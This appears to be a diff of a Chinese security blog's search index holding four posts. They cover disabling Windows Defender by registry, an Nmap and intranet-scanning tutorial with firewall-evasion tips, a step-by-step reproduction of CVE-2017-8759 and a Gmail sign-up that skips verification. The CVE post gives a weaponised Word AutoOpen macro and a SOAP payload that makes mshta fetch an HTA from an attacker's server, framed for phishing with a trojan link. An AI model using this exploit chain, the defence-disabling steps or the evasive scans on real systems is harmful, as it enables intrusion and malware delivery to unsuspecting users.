+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[windows10关闭最新Windows Defender]]></title>
+    <url>%2F2017%2F09%2F18%2Fwindows10-off-new-Windows-Defender%2F</url>
+    <content type="text"><![CDATA[简述Windows Defender，曾用名Microsoft AntiSpyware，是用来移除、隔离和预防间谍软件的程序，可以运行在Windows XP以及更高版本的操作系统上，并已经内置在Windows Vista以及以后的版本中。测试版于2005年1月6日发布，在2005年6月23日、2006年2月17日微软又发布了更新的测试版本。Windows Defender的定义库更新很频繁。在Windows 8中与Microsoft Security Essentials集成。Windows Defender不像某些其他同类免费产品一样只能扫描系统，还可以对系统进行实时监控，移除已经安装的ActiveX插件，清除大多数微软的程序和其他常用程序的历史纪录。 组策略&amp;注册表关闭最新Windows Defender使用组策略关闭最新Windows Defender本地组策略编辑器仅在Windows 10 Pro，Enterprise和Education 版本中可用。 所有版本可以使用下面的注册表。 打开步骤:开始-运行[win+r]-输入gpedit.msc win+r=键盘windows图标+r键 打开右侧菜单栏选择计算机配置-管理模板-Windows 组件-Windows Defender 防病毒程序-关闭 Windows Defender 防病毒程序 默认是未配置,我先前启用了 选择已启用,点击确定,然后关闭组策略 使用注册表关闭最新Windows Defender使用REG文件打开或关闭Windows Defender Antivirus 下面的.reg文件将添加和修改下面的注册表项中的DWORD值。 HKEY_LOCAL_MACHINE \ SOFTWARE \ Policies \ Microsoft \ Windows Defender DisableAntiSpyware DWORD (delete) or 0 = On1 = Off 关闭Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为关闭windef.reg 1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=dword:00000001 开启Windows Defender Antivirus下面代码复制,新建文本文档将内容粘贴进去,保存并重命名为开启windef.reg 1234Windows Registry Editor Version 5.00[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender]"DisableAntiSpyware"=- 点我下载:关闭和开启脚本 参考 Windows Defender Turn On or Off Windows Defender in Windows 10]]></content>
+      <categories>
+        <category>技术问题解答</category>
+      </categories>
+      <tags>
+        <tag>win10</tag>
+        <tag>删除最新Windows Defender</tag>
+        <tag>关闭最新Windows Defender</tag>
+        <tag>打开windows Defender</tag>
+        <tag>删除杀毒软件</tag>
+        <tag>组策略</tag>
+        <tag>注册表</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Nmap 中文教程]]></title>
+    <url>%2F2017%2F09%2F16%2FNmap-Chinese-Course%2F</url>
+    <content type="text"><![CDATA[0x00 简述Nmap（网络映射器）是一款用于网络发现和安全审计的网络安全工具，它是自由软件。软件名字Nmap是Network Mapper的简称。通常情况下，Nmap用于： 列举网络主机清单 管理服务升级调度 监控主机 服务运行状况 Nmap可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。 它是网络管理员必用的软件之一，用以评估网络系统安全。Nmap 是不少黑客及脚本小孩爱用的工具 。系统管理员可以利用Nmap来探测工作环境中未经批准使用的服务器，黑客通常会利用Nmap来搜集目标电脑的网络设定，从而计划攻击的方法。Nmap通常用在信息搜集阶段，用于搜集目标机主机的基本状态信息。扫描结果可以作为漏洞扫描、漏洞利用和权限提升阶段的输入。例如，业界流行的漏洞扫描工具Nessus与漏洞利用工具Metasploit都支持导入Nmap的XML格式结果，而Metasploit框架内也集成了Nmap工具（支持Metasploit直接扫描）。Nmap不仅可以用于扫描单个主机，也可以适用于扫描大规模的计算机网络（例如，扫描英特网上数万台计算机，从中找出感兴趣的主机和服务）。 0x01 命令及参数介绍常见端口扫描 map [Scan Type(s)] [Options] {target specification}scan type(s) 用于指定扫描类型options 用于指定选项target specification 用于指定扫描目标 -s 指定扫描类型如下：-sP (ping扫描) *存活主机探测-sS (TCP SYN扫描 隐身扫描) *默认扫描方式-sT (tcp 扫描) * syn 不能用时就tcp扫描-sU （UDP 扫描）-sA （ACK扫描） *三次握手 用于探测出防火墙过滤端口 实际渗透中没多大用-sV （版本探测）-A 操作系统探测-O （启用操作系统检测）-v 详细选项说明：-P0 [指定端口] (无ping扫描)-PU [指定端口] (udp ping扫描)-PS [指定端口] (TCP SYN ping 扫描)-PA [指定端口] (tcp ack ping扫描)-PI 使用真正的pingICMP echo请求来扫描目标主机是否正在运行-iL 指定扫描主机列表-iR 随机选择目标–exclude 排除扫描目标–excludefile 排除文件中目标列表-n (不用域名解析)-R (为所有目标解析域名)-T 时间优化（每隔多久发一次包 ） -T5 最快 -T0 最慢-F 快速扫描-e 指定网络接口-M 设置tcp扫描线程 输出 -oS “1337格式” 保存扫描结果输出-oN 把扫描结果重定向到一个可读的文件logfilename中-oM 每个结果一行输出-oA 同上–append-output 附在原来的结果前面 Nmap端口6个状态 open（开放的）closed（关闭的）filtered（被过滤的）不确定开放还是关闭unfiltered （未被过滤的）openfiltered （开放或者被过滤的）closedfiltered （关闭或者未被过滤的） 使用实例获取远程主机的系统类型及开放端口 nmap -sS -P0 -sV -O 获取ip和mac地址： nmap -sP -PI -PT -oN 192.168.1.0/24 扫描存活主机 nmap -sP -n 192.168.10.0/24 | cut -d” “ -f5 | awk “/192/“ windows: 1nmap -sP -n 192.168.10.0/24 | find "192" &gt;tmp_active001&amp;for /f "tokens=1,2,3,4,5" %i in (tmp_active001)do @echo %m 漏洞探测漏洞脚本根据Nmap,GitHub官方项目script文件夹下查看:https://github.com/nmap/nmap/tree/master/scripts nmap -P0 –script=smb-check-vulns –script-args=unsafe=1 -iL ip.txt 扫描常见端口:1nmap -sT -O -P0 -T5 --open -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 63.237.172.115/24 21 ftp 主要看是否支持匿名，也可以跑弱口令80 web 常见web漏洞以及是否为一些管理后台443 openssl 心脏滴血以及一些web漏洞测试873 rsync 主要看是否支持匿名，也可以跑弱口令2601,2604 zebra路由，默认密码zebra3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网6379 redis 一般无认证，可直接访问8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上9200 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞11211 memcache 未授权访问27017 mongodb 未授权访问28017 mongodb统计页面 扫描巨大网络 -sn 不扫描端口，只ping主机-PE 通过ICMP echo判定主机是否存活-n 不反向解析IP地址到域名–min-hostgroup 1024 最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描–min-parallelism 1024 这个参数非常关键，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024-oX nmap_output.xml 将结果以XML格式输出，文件名为nmap_output.xml 扫描结束，解析XML文档即可得到哪些IP地址存活. 附上自己平时用的nmap命令，由于之前发包太大vps被封过一次，所以加了一些限速的参数 1nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txt 1nmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt WindoWs自带命令端口扫描及powershellbat批量ping获取iP1234567@echo offsetlocal ENABLEDELAYEDEXPANSION@FOR /F "usebackq eol=- skip=1 delims=\" %%j IN (`net view ^| find "命令成功完成" /v ^|find "The command completed successfully." /v`) DO (@FOR /F "usebackq delims=" %%i IN (`@ping -n 1 -4 %%j ^| findstr "Pinging"`) DO (@FOR /F "usebackq tokens=2 delims=[]" %%k IN (`echo %%i`) DO (echo %%k %%j))) 内网无工具扫描一条 cmd 命令解决： for /l %i in (1,1,255) do @ping 192.168.1.%i -w 1 -n 1 | find /i “ttl”ping 整个 c 段，只输出有响应的主机。 % H” g% Q+ _6 q- P7 t更变态的： 4 o4 g8 X- v9 x&amp; w域机器对应 IP FOR /F “eol=- tokens=1 delims=\ “ %a IN (‘net view’) DO @(echo name: %a, ip: &amp; ping %a -w 1 -n 1 |find /i “ttl” &amp; echo.)把 net view 的结果，挨个 ping 一遍，并输出机器名和 ip 地址。 找主机名 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”B 段查找 for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”Win7 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Pinging”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Pinging”改成 for /l %i in (1,1,255) do @ping -a 10.0.1.%i -w 1 -n 1 | find /i “Ping”for /l %i in (1,1,255) do @ping -a 10.0.%i.1 -w 1 -n 1 | find /i “Ping”就可以兼容 Win7 了。（Win7 ping -a 输出结果关键词为 “Ping”） 另外findstr /i “pinging” 或 findstr /i “ping” 可以换成 findstr “[” 的 可以适合多语言环境 PowerShell_IPv4NetworkScannerSyntax12345.\IPv4NetworkScan.ps1 [-StartIPv4Address] &lt;IPAddress&gt; [-EndIPv4Address] &lt;IPAddress&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-Mask] &lt;String&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;].\IPv4NetworkScan.ps1 [-IPv4Address] &lt;IPAddress&gt; [-CIDR] &lt;Int32&gt; [[-Tries] &lt;Int32&gt;] [[-Threads] &lt;Int32&gt;] [[-DisableDNSResolving]] [[-EnableMACResolving]] [[-ExtendedInformations]] [[-IncludeInactive]] [&lt;CommonParameters&gt;] Example 112345PS&gt; .\IPv4NetworkScan.ps1 -StartIPv4Address 192.168.178.0 -EndIPv4Address 192.168.178.20IPv4Address Status Hostname----------- ------ --------192.168.178.1 Up fritz.box Example 2123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -Mask 255.255.255.0 -DisableDNSResolvingIPv4Address Status----------- ------192.168.178.1 Up192.168.178.22 Up Example 3123456PS&gt; .\IPv4NetworkScan.ps1 -IPv4Address 192.168.178.0 -CIDR 25 -EnableMACResolvingIPv4Address Status Hostname MAC Vendor----------- ------ -------- --- ------192.168.178.1 Up fritz.box XX-XX-XX-XX-XX-XX AVM Audiovisuelles Marketing und &gt;Computersysteme GmbH192.168.178.22 Up XXXXX-PC.fritz.box XX-XX-XX-XX-XX-XX ASRock Incorporation 下载链接: https://github.com/BornToBeRoot/PowerShell_IPv4NetworkScanner.git 结语建议大家在内网渗透中尽量使用内网无工具或PowerShell进行端口探测与扫描,防止防火墙报警、拦截 参考文章 nmap语法 内网渗透测试定位技术总结]]></content>
+      <categories>
+        <category>渗透教程</category>
+      </categories>
+      <tags>
+        <tag>渗透教程</tag>
+        <tag>nmap中文教程</tag>
+        <tag>端口扫描</tag>
+        <tag>漏洞扫描</tag>
+        <tag>内网渗透</tag>
+        <tag>漏洞利用</tag>
+        <tag>防火墙</tag>
+        <tag>powershell端口扫描</tag>
+        <tag>bat端口扫描</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CVE-2017-8759-微软.net远程代码执行漏洞复现]]></title>
+    <url>%2F2017%2F09%2F14%2FCVE-2017-8759-Exploit%2F</url>
+    <content type="text"><![CDATA[基本信息漏洞名称：.NET Framework远程代码执行漏洞漏洞编号：CVE-2017-8759漏洞影响：.NET系列产品的远程代码执行（RCE）并进一步控制系统利用场景：远程钓鱼、社会工程（打开有惊喜哟）影响版本：以下.NET版本 Microsoft .NET Framework 4.6.2 Microsoft .NET Framework 4.6.1 Microsoft .NET Framework 3.5.1 Microsoft .NET Framework 4.7 Microsoft .NET Framework 4.6 Microsoft .NET Framework 4.5.2 Microsoft .NET Framework 3.5 Microsoft .NET Framework 2.0 SP2影响产品：Office(word excel)Edge IE WinOS Skype Lync Sharepoint加固方法：软件类漏洞，微软补丁会悄悄地告诉你https://portal.msrc.microsoft.com/en-us/security-guidance 利用过程简述 本次测试环境:Windows 2007 x64、Kali Linux X64、Python、Office Word 2016 X64 本次测试攻击利用Word宏,其他方法暂未测试. 从GitHub下载文件git clone https://github.com/Voulnet/CVE-2017-8759-Exploit-sample.git修改文件夹exploit.txt内容&lt;soap:address location=&quot;http://127.0.0.1:8080?C:\Windows\System32\mshta.exe?http://127.0.0.1:8080/cmd.hta&quot;/&gt; soap标签内的ip地址替换成你的Web服务器地址 修改cmd.hta内容本次不做修改,仅做测试[替换标注内容为木马下载链接或其他姿势进行远程攻击] 启动Http服务器python -m SimpleHTTPServer 8080新建word文档 可以利用从GitHub下载的word直接修改宏,在这里我给大家直接新建演示一次. 新建一个格式为doc的文档,内容自定义主要目的是利用社工诱导用户打开文档及相信该文档是正常文档未涉及钓鱼攻击. 新建宏步骤:视图-宏-宏名”AutoOpen”-创建,输入代码为: Sub AutoOpen() Set x = GetObject(&quot;soap:wsdl=http://127.0.0.1:8080/exploit.txt&quot;) End Sub同样上面的IP替换你的Http服务器地址 Ctrl+s保存一下,然后点右上角的word图标返回到word界面. 运行结果由于我先前测试时启用了宏,所以没有提示,首次运行会提示需要启用宏.打开文档会生成三个文件在当前路径下. 参考文章 微软.NET远程代码执行漏洞0day分析(社工钓鱼) CVE-2017-8759-Weaponisation Tutorial CVE2017-8759 - RTF WSDL SOAP Parser Vulnerability 1-day]]></content>
+      <categories>
+        <category>漏洞利用</category>
+      </categories>
+      <tags>
+        <tag>漏洞利用</tag>
+        <tag>exploit</tag>
+        <tag>cve-2017-8759</tag>
+        <tag>微软漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[匿名注册谷歌邮箱[已失效]]]></title>
+    <url>%2F2017%2F09%2F13%2Fanonymous-register-gmail%2F</url>
+    <content type="text"><![CDATA[不需要邮箱验证，不需要手机验证 注册步骤: 从 www.gmail.com 入口，点击注册。 姓氏要手打。（No老师说的） 电话区域的区号选择 特克斯和凯科斯群岛 (Turks &amp; Caicos Islands) 邮件区域不用填写 地区选择 特里斯坦-达库尼亚群岛 (Tristan da Cunha) 常见问题如遇到需要输入电话号码验证gmail邮箱 直接网页后退在前进即可解决此问题。 测试结果:需使用香港未注册gmail账户的Ss&amp;Vpn,才能注册成功,不建议批量注册及频繁注册 参考文章 匿名注注册Google邮箱]]></content>
+      <categories>
+        <category>福利</category>
+      </categories>
+      <tags>
+        <tag>匿名注册谷歌邮箱</tag>
+        <tag>香港Vpn</tag>
+        <tag>Gmail</tag>
+      </tags>
+  </entry>
 </search>
